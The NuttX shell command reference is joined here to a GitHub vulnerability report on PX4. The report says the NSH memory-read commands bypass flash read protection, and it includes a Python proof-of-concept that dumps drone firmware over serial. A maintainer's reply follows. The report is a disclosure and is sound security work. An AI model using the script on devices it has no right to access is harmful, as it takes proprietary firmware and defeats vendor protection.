**Command Syntax**:

```
ps

```

**Synopsis**. Show the currently active threads and tasks. For
example:

```
nsh> ps
PID PRI POLICY   TYPE    NPX STATE    EVENT     SIGMASK  COMMAND
  0   0 FIFO     Kthread --- Ready              00000000 Idle Task
  1 128 RR       Task    --- Running            00000000 init
  2 128 FIFO     Task    --- Waiting  Semaphore 00000000 nsh_telnetmain()
  3 100 RR       pthread --- Waiting  Semaphore 00000000 <pthread>(21)
nsh>

```

NOTE: This commands depends upon having the *procfs* file system
configured into the system. The *procfs* file system must also
have been mounted with a command like:

```
nsh> mount -t procfs /proc

```

## `mkdir` Create a Directory[ï](#mkdir-create-a-directory "Permalink to this heading")

**Command Syntax**:

```
mkdir <path>

```

**Synopsis**. Create the directory at `<path>`. All components
of `<path>` except the final directory name must exist on a
mounted file system; the final directory must not.

**Limited to Mounted File Systems**. Recall that NuttX uses a
[pseudo file system](../../reference/user/10_filesystem.html#file-system-overview)
for its root file system. The `mkdir` command can only be used
to create directories in volumes set up with the
[mount](#cmdmount) command; it cannot be used to create
directories in the *pseudo* file system.

**Example**:

```
nsh> mkdir /mnt/fs/tmp
nsh> ls -l /mnt/fs
/mnt/fs:
 drw-rw-rw-       0 TESTDIR/
 drw-rw-rw-       0 TMP/
nsh>

```

## `mkfatfs` Create a FAT File System[ï](#mkfatfs-create-a-fat-file-system "Permalink to this heading")

**Command Syntax**

> mkfatfs [-F <fatsize>] [-r <rootdirentries>] <block-driver>

**Synopsis**. Format a fat file system on the block device
specified by `<block-driver>` path. The FAT size may be provided
as an option. Without the `<fatsize>` option, `mkfatfs` will
select either the FAT12 or FAT16 format. For historical reasons,
if you want the FAT32 format, it must be explicitly specified on
the command line.

The `-r` option may be specified to select the the number of
entries in the root directory for FAT12 and FAT16 file systems.
Typical values for small volumes would be 112 or 224; 512 should
be used for large volumes, such as hard disks or very large SD
cards. The default is 512 entries in all cases.

The reported number of root directory entries used with FAT32 is
zero because the FAT32 root directory is a cluster chain.

NSH provides this command to access the
`mkfatfs()` NuttX API. This block device must
reside in the NuttX [pseudo file system](../../reference/user/10_filesystem.html#file-system-overview)
and must have been created by some call to `register_blockdriver()`
(see `include/nuttx/fs/fs.h`).

## `mkfifo` Create a FIFO[ï](#mkfifo-create-a-fifo "Permalink to this heading")

**Command Syntax**:

```
mkfifo <path>

```

**Synopsis**. Creates a FIFO character device anywhere in the
pseudo file system, creating whatever pseudo directories that may
be needed to complete the `<path>`. By convention, however,
device drivers are place in the standard `/dev` directory. After
it is created, the FIFO device may be used as any other device
driver. NSH provides this command to access the
``mkfifo()` NuttX API.

**Example**:

```
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 console
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
nsh> mkfifo /dev/fifo
nsh> ls -l /dev
ls -l /dev
/dev:
 crw-rw-rw-       0 console
 crw-rw-rw-       0 fifo
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
nsh>

```

## `mkrd` Create a RAMDISK[ï](#mkrd-create-a-ramdisk "Permalink to this heading")

**Command Syntax**:

```
mkrd [-m <minor>] [-s <sector-size>] <nsectors>

```

**Synopsis**. Create a ramdisk consisting of `<nsectors>`, each
of size `<sector-size>` (or 512 bytes if `<sector-size>` is
not specified. The ramdisk will be registered as
`/dev/ram<minor>`. If `<minor>` is not specified, `mkrd`
will attempt to register the ramdisk as `/dev/ram0`.

**Example**:

```
nsh> ls /dev
/dev:
 console
 null
 ttyS0
 ttyS1
nsh> mkrd 1024
nsh> ls /dev
/dev:
 console
 null
 ram0
 ttyS0
 ttyS1
nsh>

```

Once the ramdisk has been created, it may be formatted using the
`mkfatfs` command and mounted using the `mount` command.

**Example**:

```
nsh> mkrd 1024
nsh> mkfatfs /dev/ram0
nsh> mount -t vfat /dev/ram0 /tmp
nsh> ls /tmp
/tmp:
nsh>

```

## `mount` Mount a File System[ï](#mount-mount-a-file-system "Permalink to this heading")

**Command Syntax**:

```
mount -t <fstype> [-o <options>] <block-device> <dir-path>

```

**Synopsis**. The `mount` command performs one of two different
operations. If no parameters are provided on the command line
after the `mount` command, then the `mount` command will
enumerate all of the current mountpoints on the console.

If the mount parameters are provided on the command after the
`mount` command, then the `mount` command will mount a file
system in the NuttX pseudo-file system. `mount` performs a three
way association, binding:

> 1. **File System.** The â-t `<fstype>`â option identifies the
>    type of file system that has been formatted on the
>    `<block-device>`. As of this writing, `vfat` is the only
>    supported value for `<fstype>`
> 2. **Block Device.** The `<block-device>` argument is the full
>    or relative path to a block driver inode in the
>    [pseudo file system](../../reference/user/10_filesystem.html#file-system-overview). By
>    convention, this is a name under the `/dev` sub-directory.
>    This `<block-device>` must have been previously formatted
>    with the same file system type as specified by `<fstype>`
> 3. **Mount Point.** The mount point, `<dir-path>`, is the
>    location in the [pseudo file system](../../reference/user/10_filesystem.html#file-system-overview)
>    where the mounted volume will appear. This mount point can only
>    reside in the NuttX
>    [pseudo file system](../../reference/user/10_filesystem.html#file-system-overview). By
>    convention, this mount point is a subdirectory under `/mnt`.
>    The mount command will create whatever pseudo directories that
>    may be needed to complete the full path but the full path must
>    not already exist.

After the volume has been mounted in the NuttX
[pseudo file system](../../reference/user/10_filesystem.html#file-system-overview), it may be
access in the same way as other objects in the file system.

**Examples**:

Using `mount` to mount a file system:

```
nsh> ls -l /dev
/dev:
 crw-rw-rw-       0 console
 crw-rw-rw-       0 null
 brw-rw-rw-       0 ram0
nsh> ls /mnt
nsh: ls: no such directory: /mnt
nsh> mount -t vfat /dev/ram0 /mnt/fs
nsh> ls -l /mnt/fs/testdir
/mnt/fs/testdir:
 -rw-rw-rw-      15 TESTFILE.TXT
nsh> echo "This is a test" >/mnt/fs/testdir/example.txt
nsh> ls -l /mnt/fs/testdir
/mnt/fs/testdir:
-rw-rw-rw-      15 TESTFILE.TXT
 -rw-rw-rw-      16 EXAMPLE.TXT
nsh> cat /mnt/fs/testdir/example.txt
This is a test
nsh>

```

Using `mount` to enumerate mounts:

```
nsh> mount
  /etc type romfs
  /mnt/fs type vfat
  /tmp type vfat

```

## `mv` Rename a File[ï](#mv-rename-a-file "Permalink to this heading")

**Command Syntax**:

```
mv <old-path> <new-path>

```

**Synopsis**. Rename the file object at `<old-path>` to
`<new-path>`. Both paths must reside in the same mounted file
system.

## `nfsmount` Mount an NFS file system[ï](#nfsmount-mount-an-nfs-file-system "Permalink to this heading")

**Command Syntax**:

```
nfsmount <server-address> <mount-point> <remote-path>

```

**Synopsis**. Mount the remote NFS server directory<remote-path>
at <mount-point> on the target machine. <server-address> is the IP
address of the remote server.

## `nslookup` Lookup a network address[ï](#nslookup-lookup-a-network-address "Permalink to this heading")

**Command Syntax**:

```
nslookup <host-name>

```

**Synopsis**. Lookup and print the IP address associated with
`<host-name>`.

## `passwd` Change a Userâs Password[ï](#passwd-change-a-user-s-password "Permalink to this heading")

**Command Syntax**:

```
passwd <username> <password>

```

**Synopsis**. Set the password for the existing user <username> to
<password>.

## `pmconfig` Manage Power Management Subsystem[ï](#pmconfig-manage-power-management-subsystem "Permalink to this heading")

**Command Syntax**:

```
pmconfig [stay|relax] [normal|idle|standby|sleep]

```

**Synopsis**. Control power management subsystem.

## `poweroff` Shut the system down[ï](#poweroff-shut-the-system-down "Permalink to this heading")

**Command Syntax**:

```
poweroff [<n>]

```

**Synopsis**. Shutdown and power off the system immediately. This
command depends on board-specific hardware support to power down
the system. The optional,decimal numeric argument may be included
to provide power off mode to board-specific power off logic.

NOTE: Supporting both the `poweroff` and `shutdown` commands
is redundant.

## `put` Send File Via TFTP[ï](#put-send-file-via-tftp "Permalink to this heading")

**Command Syntax**:

```
put [-b|-n] [-f <remote-path>] -h <ip-address> <local-path>

```

**Synopsis**. Copy the file at `<local-address>` to the host
whose IP address is identified by `<ip-address>`.

**Other options:**

| `-f <remote-path>` | The file will be saved relative with the same name on the host unless <remote-path> is provided. |
| --- | --- |
| `-b|-n` | Selects either binary (âoctetâ) or text (ânetasciiâ) transfer mode. Default: text. |

## `pwd` Show Current Working Directory[ï](#pwd-show-current-working-directory "Permalink to this heading")

**Command Syntax**:

```
pwd

```

**Synopsis**. Show the current working directory:

```
nsh> cd /dev
nsh> pwd
/dev
nsh>

```

Same as `echo $PWD`:

```
nsh> echo $PWD
/dev
nsh>

```

## `readlink` Show target of a link[ï](#readlink-show-target-of-a-link "Permalink to this heading")

**Command Syntax**:

```
readlink <link>

```

**Synopsis**. Show the target of the soft link at the path
`<link>`.

## `reboot` Reboot the system[ï](#reboot-reboot-the-system "Permalink to this heading")

**Command Syntax**:

```
reboot [<n>]

```

**Synopsis**. Reset and reboot the system immediately. This
command depends on hardware support to reset the system. The
optional, decimal numeric argument <n> may be included to provide
a reboot mode to board-specific reboot logic.

NOTE: Supporting both the `reboot` and `shutdown` commands is
redundant.

## `rm` Remove a File[ï](#rm-remove-a-file "Permalink to this heading")

**Command Syntax**:

```
rm <file-path>

```

**Synopsis**. Remove the specified `<file-path>` name from the
mounted file system. Recall that NuttX uses a
[pseudo file system](../../reference/user/10_filesystem.html#file-system-overview) for its root
file system. The `rm` command can only be used to remove
(unlink) files in volumes set up with the
[mount](#cmdmount) command; it cannot be used to remove
names in the *pseudo* file system.

**Example**:

```
nsh> ls /mnt/fs/testdir
/mnt/fs/testdir:
 TESTFILE.TXT
 EXAMPLE.TXT
nsh> rm /mnt/fs/testdir/example.txt
nsh> ls /mnt/fs/testdir
/mnt/fs/testdir:
 TESTFILE.TXT
nsh>

```

## `rmdir` Remove a Directory[ï](#rmdir-remove-a-directory "Permalink to this heading")

**Command Syntax**:

```
rmdir <dir-path>

```

**Synopsis**. Remove the specified `<dir-path>` directory from
the mounted file system. Recall that NuttX uses a
[pseudo file system](../../reference/user/10_filesystem.html#file-system-overview) for its root
file system. The `rmdir` command can only be used to remove
directories from volumes set up with the [mount](#cmdmount)
command it cannot be used to remove directories from the *pseudo*
file system.

**Example**:

```
nsh> mkdir /mnt/fs/tmp
nsh> ls -l /mnt/fs
/mnt/fs:
 drw-rw-rw-       0 TESTDIR/
 drw-rw-rw-       0 TMP/
nsh> rmdir /mnt/fs/tmp
nsh> ls -l /mnt/fs
/mnt/fs:
 drw-rw-rw-       0 TESTDIR/
nsh>

```

## `rmmod` Remove on OS Module[ï](#rmmod-remove-on-os-module "Permalink to this heading")

**Command Syntax**:

```
rmmod <module-name>

```

**Synopsis**. Remove the loadable OS module with the
<module-name>. NOTE: An OS module can only be removed if it is not
busy.

**Example**:

```
nsh> lsmod
NAME                 INIT   UNINIT      ARG     TEXT     SIZE     DATA     SIZE
mydriver         20404659 20404625        0 20404580      552 204047a8        0
nsh> rmmod mydriver
nsh> lsmod
NAME                 INIT   UNINIT      ARG     TEXT     SIZE     DATA     SIZE
nsh>

```

## `route` Show routing table[ï](#route-show-routing-table "Permalink to this heading")

**Command Syntax**:

```
route ipv4|ipv6

```

**Synopsis**. Show the contents of routing table for IPv4 or IPv6.

If only IPv4 or IPv6 is enabled, then the argument is optional
but, if provided, must match the enabled internet protocol
version.

## `rptun` Start/Stop the OpenAMP RPC Tunnel[ï](#rptun-start-stop-the-openamp-rpc-tunnel "Permalink to this heading")

**Command Syntax**:

```
rptun start|stop <dev-path>

```

**Synopsis**. Start or stop the OpenAMP RPC tunnel device at <dev-path>.

## `set` Set a Variable[ï](#set-set-a-variable "Permalink to this heading")

**Command Syntax**:

```
set [{+|-}{e|x|xe|ex}] [<name> <value>]

```

**Synopsis**. Set the variable `<name>` to the string `<value>` and
or set NSH parser control options.

For example, a variable may be set like this:

```
nsh> echo $foobar

nsh> set foobar foovalue
nsh> echo $foobar
foovalue
nsh>

```

If `CONFIG_NSH_VARS` is selected, the effect of this `set` command
is to set the local NSH variable. Otherwise, the group-wide environment
variable will be set.

If the local NSH variable has already been *promoted* to an environment
variable via the [export](#cmdexport), then the `set` command
will set the value of the environment variable rather than the local NSH
variable.

Note

The Bash shell does not work this way. Bash would set the value
of both the local Bash variable and the environment variable of the
same name to the same value.

If `CONFIG_NSH_VARS=y` is selected and no arguments are provided, then
the `set` command will list all of the local NSH variables:

```
nsh> set
foolbar=foovalue

```

Set the *exit on error control* and/or *print a trace* of commands when
parsing scripts in NSH. The settings are in effect from the point of
execution, until they are changed again, or in the case of the
initialization script, the settings are returned to the default settings
when it exits. Included child scripts will run with the parents settings
and changes made in the child script will effect the parent on return.

> * Use `set -e` to enable and `set +e` to disable (ignore) the exit
>   condition on commands. The default is -e. Errors cause script to
>   exit.
> * Use `set -x` to enable and `set +x` to disable (silence) printing
>   a trace of the script commands as they are executed. The default is
>   `+x`: no printing of a trace of script commands as they are
>   executed.

Example 1 - no exit on command not found:

```
set +e
notacommand

```

Example 2 - will exit on command not found:

```
set -e
notacommand

```

Example 3 - will exit on command not found, and print a trace of the
script commands:

```
set -ex

```

Example 4 - will exit on command not found, and print a trace of the
script commands and set foobar to foovalue:

```
set -ex foobar foovalue
nsh> echo $foobar
foovalue

```

## `sh` Execute an NSH Script[ï](#sh-execute-an-nsh-script "Permalink to this heading")

**Command Syntax**:

```
sh <script-path>

```

**Synopsis**. Execute the sequence of NSH commands in the file referred
to by `<script-path>`.

## `shutdown` Shut the system down[ï](#shutdown-shut-the-system-down "Permalink to this heading")

**Command Syntax**:

```
shutdown [--reboot]

```

**Synopsis**. Shutdown and power off the system or, optionally, reset
and reboot the system immediately. This command depends on hardware
support to power down or reset the system; one, both, or neither
behavior may be supported.

NOTE: The `shutdown` command duplicates the behavior of the
`poweroff` and `eboot` commands.

## `sleep` Wait for Seconds[ï](#sleep-wait-for-seconds "Permalink to this heading")

**Command Syntax**:

```
sleep <sec>

```

**Synopsis**. Pause execution (sleep) for `<sec>` seconds.

## `telnetd` Time Start the Telnet Daemon[ï](#telnetd-time-start-the-telnet-daemon "Permalink to this heading")

**Command Syntax**:

```
telnetd

```

**Synopsis**. Start the Telnet daemon if it is not already running.

The Telnet daemon may be started either programmatically by calling
`nsh_telnetstart()` or it may be started from the NSH command line
using this `telnetd` command.

Normally this command would be suppressed without
`CONFIG_SYSTEM_TELNETD` because the Telnet daemon is
automatically started in `nsh_main.c`. The exception is when
`CONFIG_NSH_NETLOCAL` is selected. In that case, the network is not
enabled at initialization but rather must be enabled from the NSH
command line or via other applications.

In that case, when `nsh_telnetstart()` is called before the the
network is initialized, it will fail.

## `time` Time execution of another command[ï](#time-time-execution-of-another-command "Permalink to this heading")

**Command Syntax**:

```
time "<command>"

```

**Synopsis**. Perform command timing. This command will execute the
following <command> string and then show how much time was required to
execute the command. Time is shown with a resolution of 100 microseconds
which may be beyond the resolution of many configurations. Note that the
<command> must be enclosed in quotation marks if it contains spaces or
other delimiters.

**Example**:

```
nsh> time "sleep 2"

2.0100 sec
nsh>

```

The additional 10 milliseconds in this example is due to the way that
the sleep command works: It always waits one system clock tick longer
than requested and this test setup used a 10 millisecond periodic system
timer. Sources of error could include various quantization errors,
competing CPU usage, and the additional overhead of the time command
execution itself which is included in the total.

The reported time is the elapsed time from starting of the command to
completion of the command. This elapsed time may not necessarily be just
the processing time for the command. It may included interrupt level
processing, for example. In a busy system, command processing could be
delayed if pre-empted by other, higher priority threads competing for
CPU time. So the reported time includes all CPU processing from the
start of the command to its finish possibly including unrelated
processing time during that interval.

Notice that:

```
nsh> time "sleep 2 &"
sleep [3:100]

0.0000 sec
nsh>

```

Since the sleep command is executed in background, the sleep command
completes almost immediately. As opposed to the following where the time
command is run in background with the sleep command:

```
nsh> time "sleep 2" &
time [3:100]
nsh>
2.0100 sec

```

## `truncate` Set the Size of a File[ï](#truncate-set-the-size-of-a-file "Permalink to this heading")

**Command Syntax**:

```
truncate -s <length> <file-path>

```

**Synopsis**. Shrink or extend the size of the regular file at
<file-path> to the specified<length>.

A <file-path> argument that does not exist is created. The <length>
option is NOT optional.

If a <file-path> is larger than the specified size, the extra data is
lost. If a <file-path> is shorter, it is extended and the extended part
reads as zero bytes.

## `umount` Unmount a File System[ï](#umount-unmount-a-file-system "Permalink to this heading")

**Command Syntax**:

```
umount <dir-path>

```

**Synopsis**. Un-mount the file system at mount point `<dir-path>`.
The `umount` command can only be used to un-mount volumes previously
mounted using [mount](#cmdmount) command.

**Example**:

```
nsh> ls /mnt/fs
/mnt/fs:
 TESTDIR/
nsh> umount /mnt/fs
nsh> ls /mnt/fs
/mnt/fs:
nsh: ls: no such directory: /mnt/fs
nsh>

```

## `uname` Print system information[ï](#uname-print-system-information "Permalink to this heading")

**Command Syntax**:

```
uname [-a | -imnoprsv]

```

**Synopsis**. Print certain system information. With no options, the
output is the same as -s.

| `-a` | Print all information, in the following order, except omit -p and -i if unknown: |
| --- | --- |
| `-s, -o` | Print the operating system name (NuttX) |
| `-n` | Print the network node hostname (only available if CONFIG\_NET=y) |
| `-r` | Print the kernel release |
| `-v` | Print the kernel version |
| `-m` | Print the machine hardware name |
| `-i` | Print the machine platform name |
| `-p` | Print âunknownâ |

## `unset` Unset an Environment Variable[ï](#unset-unset-an-environment-variable "Permalink to this heading")

**Command Syntax**:

> unset <name>

**Synopsis**. Remove the value associated with the variable `<name>`.
This will remove the name-value pair from both the NSH local variables
and the group-wide environment variables. For example:

```
nsh> echo $foobar
foovalue
nsh> unset foobar
nsh> echo $foobar

nsh>

```

## `uptime` Show how long the system has been running[ï](#uptime-show-how-long-the-system-has-been-running "Permalink to this heading")

**Command Syntax**:

> uptime [-sph]

**Synopsis**. Display of the following information: the current time,
how long the system has been running, and the load averages for the past 1, 5,
and 15 minutes.

**Options**

| `-p` | show uptime in pretty format |
| --- | --- |
| `-s` | system up since |
| `-h` | display this help and exit |

## `urldecode` URL Decode[ï](#urldecode-url-decode "Permalink to this heading")

**Command Syntax**:

```
urldecode [-f] <string or filepath>

```

**Synopsis**. *To be provided.*

## `urlencode` URL Encode[ï](#urlencode-url-encode "Permalink to this heading")

**Command Syntax**:

```
urlencode [-f] <string or filepath>

```

**Synopsis**. *To be provided.*

## `useradd` Add a New User[ï](#useradd-add-a-new-user "Permalink to this heading")

**Command Syntax**:

```
useradd <username> <password>

```

**Synopsis**. Add a new user with <username> and <password>.

## `userdel` Delete a user[ï](#userdel-delete-a-user "Permalink to this heading")

**Command Syntax**:

```
userdel <username>

```

**Synopsis**. Delete the user with the name <username>.

## `usleep` Wait for Microseconds[ï](#usleep-wait-for-microseconds "Permalink to this heading")

**Command Syntax**:

```
usleep <usec>

```

**Synopsis**. Pause execution (sleep) of `<usec>` microseconds.

## `wget` Get File Via HTTP[ï](#wget-get-file-via-http "Permalink to this heading")

**Command Syntax**

> wget [-o <local-path>] <url>

**Synopsis**. Use HTTP to copy the file at `<url>` to the current
directory.

**Options**

| `-o <local-path>` | The file will be saved relative to the current working directory and with the same name as on the HTTP server unless <local-path> is provided. |
| --- | --- |

## `xd` Hexadecimal Dump of Memory[ï](#xd-hexadecimal-dump-of-memory "Permalink to this heading")

**Command Syntax**:

```
xd <hex-address> <byte-count>

```

**Synopsis**. Dump `<byte-count>` bytes of data from address
`<hex-address>`.

**Example**:

```
nsh> xd 410e0 512
Hex dump:
0000: 00 00 00 00 9c 9d 03 00 00 00 00 01 11 01 10 06 ................
0010: 12 01 11 01 25 08 13 0b 03 08 1b 08 00 00 02 24 ....%..........$
...
01f0: 08 3a 0b 3b 0b 49 13 00 00 04 13 01 01 13 03 08 .:.;.I..........
nsh>

```

## Built-In Commands[ï](#built-in-commands "Permalink to this heading")

In addition to the commands that are part of NSH listed in the previous
section above, there can be additional, external *built-in* applications
that can be added to NSH. These are separately excecuble programs but
will appear much like the commands that are a part of NSH. The primary
difference from the userâs perspective is that help information about
the built-in applications is not available directly from NSH. Rather,
you will need to execute the application with the `-h` option to get
help about using the built-in applications.

There are several built-in applications in the `apps/` repository. No
attempt is made here to enumerate all of them. But a few of the more
common, useful built-in applications are listed below.

## `ping` and `ping6` Check Network Peer[ï](#ping-and-ping6-check-network-peer "Permalink to this heading")

**Command Syntax**:

```
ping  [-c <count>] [-i <interval>] <ip-address>
ping6 [-c <count>] [-i <interval>] <ip-address>

```

**Synopsis**. Test the network communication with a remote peer.
Example:

```
nsh> ping 10.0.0.1
PING 10.0.0.1 56 bytes of data
56 bytes from 10.0.0.1: icmp_seq=1 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=2 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=3 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=4 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=5 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=6 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=7 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=8 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=9 time=0 ms
56 bytes from 10.0.0.1: icmp_seq=10 time=0 ms
10 packets transmitted, 10 received, 0% packet loss, time 10190 ms
nsh>

```

`ping6` differs from `ping` in that it uses IPv6 addressing.

 [Previous](nsh.html "Overview")
[Next](config.html "Configuration Settings")

---

© Copyright 2023, The Apache Software Foundation.



=== Content from github.com_c0653c85_20250114_204334.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPX4%2FPX4-Autopilot%2Fissues%2F17062)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPX4%2FPX4-Autopilot%2Fissues%2F17062)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=PX4%2FPX4-Autopilot)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PX4](/PX4)
/
**[PX4-Autopilot](/PX4/PX4-Autopilot)**
Public

* [Notifications](/login?return_to=%2FPX4%2FPX4-Autopilot) You must be signed in to change notification settings
* [Fork
  13.6k](/login?return_to=%2FPX4%2FPX4-Autopilot)
* [Star
   8.8k](/login?return_to=%2FPX4%2FPX4-Autopilot)

* [Code](/PX4/PX4-Autopilot)
* [Issues
  1.4k](/PX4/PX4-Autopilot/issues)
* [Pull requests
  535](/PX4/PX4-Autopilot/pulls)
* [Actions](/PX4/PX4-Autopilot/actions)
* [Projects
  0](/PX4/PX4-Autopilot/projects)
* [Security](/PX4/PX4-Autopilot/security)
* [Insights](/PX4/PX4-Autopilot/pulse)

Additional navigation options

* [Code](/PX4/PX4-Autopilot)
* [Issues](/PX4/PX4-Autopilot/issues)
* [Pull requests](/PX4/PX4-Autopilot/pulls)
* [Actions](/PX4/PX4-Autopilot/actions)
* [Projects](/PX4/PX4-Autopilot/projects)
* [Security](/PX4/PX4-Autopilot/security)
* [Insights](/PX4/PX4-Autopilot/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FPX4%2FPX4-Autopilot%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FPX4%2FPX4-Autopilot%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Nsh Debug Commands Vulnerability Report #17062

Closed

[swkim101](/swkim101) opened this issue
Mar 9, 2021
· 6 comments
 · Fixed by [#17264](https://github.com/PX4/PX4-Autopilot/pull/17264)

Closed

# [Nsh Debug Commands Vulnerability Report](#top) #17062

[swkim101](/swkim101) opened this issue
Mar 9, 2021
· 6 comments
 · Fixed by [#17264](https://github.com/PX4/PX4-Autopilot/pull/17264)

Assignees
[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)

Labels
[priority-critical](/PX4/PX4-Autopilot/labels/priority-critical)

## Comments

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=80&u=315a809037b8e23ed194894a863fc8ebda331245&v=4)](/swkim101)

Copy link

### **[swkim101](/swkim101)** commented [Mar 9, 2021](#issue-825439181)

| Nsh's `mb`, `mh`, and `mw` commands can leak intellectual property. Exploiting those commands makes it possible to extract firmware from the flash memory because `mb`, `mh`, and `mw` can read the firmware code at an arbitrary location. You may know that some commercial vendors can customize their firmware without opening even binary code. However, those commands can neutralize the intellectual protection scheme to prevent from reading binary firmware code.  We found this issue on [Yuneec](https://us.yuneec.com/), a commercial drone vendor, which has sold multiple drone models such as Typhoon H. This drone vendor has made efforts to protect its firmware from reading out, applying [ST's hardware read protection](https://www.st.com/resource/en/application_note/dm00186528-proprietary-code-read-out-protection-on-microcontrollers-of-the-stm32f4-series-stmicroelectronics.pdf) to its drones. Nevertheless, the `mb 0x8000000` command naively prints Typhoon H's firmware binary code, bypassing the protection scheme.  PoC is as follows:  ``` import serial ser = serial.Serial(    port='COM7',\    baudrate=57600,\    parity=serial.PARITY_NONE,\    stopbits=serial.STOPBITS_ONE,\    bytesize=serial.EIGHTBITS,\    timeout=0) f = open('output_db000.txt', 'wb') for addr in range(0x080db000, 0x08200000, 0x1000):    count = 0    ser.write(b'mw ')    ser.write(bytes(hex(addr), 'ascii'))    ser.write(b' 1000\r\n')    print(hex(addr))    while True:        line = ser.readline()        f.write(line)        #print(line)            if(len(line) <= 5 and count != 0):            break        count += 1 f.close() ```  Only if possible, we believe the best way to prevent this vulnerability is to remove mb, mh, and mw commands. If that is not allowed due to debugging purpose, we would like to suggest the following actions can help protect intellectual properties from this vulnerability: (1) please add comments in the source code. (2) please show warnings in compile messages. (3) please disable those commands in the default configuration (`CONFIG_NSH_DISABLE_MW=y`) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@LorenzMeier](https://avatars.githubusercontent.com/u/1208119?s=80&u=dce4be2e573e6f8848b364648b5a23945edd1648&v=4)](/LorenzMeier)

Copy link

Member

### **[LorenzMeier](/LorenzMeier)** commented [Mar 9, 2021](#issuecomment-793484948)

| Once you have access to NSH you have the equivalent of root access to the system. If a manufacturer enables NSH access, they have already decided (implicitly or explicitly) to provide full access to the system, with all ramifications.  So I would argue that anyone enabling NSH in their build is ok with that and that the correct fix here is to disable NSH access altogether if you don't want that. |
| --- |

All reactions

Sorry, something went wrong.

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=80&u=315a809037b8e23ed194894a863fc8ebda331245&v=4)](/swkim101)

Copy link

Author

### **[swkim101](/swkim101)** commented [Mar 10, 2021](#issuecomment-794856171)

